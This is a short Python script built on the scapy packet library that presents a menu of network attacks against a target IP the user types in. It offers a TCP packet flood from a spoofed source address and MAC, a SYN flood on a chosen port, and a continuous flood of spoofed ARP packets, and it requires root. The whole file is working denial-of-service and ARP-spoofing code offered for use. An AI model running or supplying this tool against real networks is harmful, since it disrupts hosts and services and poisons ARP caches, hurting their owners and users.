# Requirements
# Run: sudo apt-get update
# Run: sudo pip3 install --pre scapy[complete]

import scapy.all as sc
import os

sourceIP = "1.1.1.1"
sourceMAC = "00:11:22:33:44:55"

def sendWithWhile(packet):
    while True:
        sc.sendp(packet)

if __name__ == "__main__":
    if os.geteuid() == 0:
        getAttackType = int(input("[INFO] Press CTRL + C for ending the attacks.\nFor TCP DoS press 1\nFor SYN DoS press 2\nFor send ARP packets press 3\n> "))
        targetIP = str(input("Target IP Address: "))
        try:
            if getAttackType == 1:
                tcpPacket = sc.Ether(src=sourceMAC)/sc.IP(src=sourceIP, dst=targetIP)/sc.TCP()
                sendWithWhile(tcpPacket)
            elif getAttackType == 2:
                getPort = input("Port: ")
                sc.srloop(sc.IP(dst=targetIP)/sc.TCP(dport=int(getPort), flags='S'))
            elif getAttackType == 3:
                arpPacket = sc.ARP(hwsrc=sourceMAC, psrc=sourceIP, pdst=targetIP)
                sendWithWhile(arpPacket)
            else:
                print("[*] Please choose from the menu.")
        except KeyboardInterrupt:
            print("[INFO] Program ended by you.")
    else:
        print("[WARN] You have to be root.")
